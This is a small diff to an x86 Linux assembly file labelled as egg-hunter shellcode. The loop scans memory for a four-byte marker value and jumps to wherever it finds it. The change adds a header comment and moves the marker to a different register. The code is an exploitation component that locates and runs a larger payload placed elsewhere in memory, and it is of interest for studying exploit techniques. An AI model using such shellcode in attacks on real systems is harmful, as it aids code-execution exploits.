@@ -1,10 +1,15 @@
+; Egg Hunter Shellcode Linux x86
+; by Daniel Roberson 
+;
+;
+
+
 BITS 32
 
-cdq
-mov edx, 0x424a424a
+mov ebx, 0x424a424a             ; EGG: inc edx; dec edx; inc edx; dec edx
 loop:
 	inc eax
-	cmp DWORD [eax], edx
+	cmp DWORD [eax], ebx
 	jne loop
 	jmp eax
 
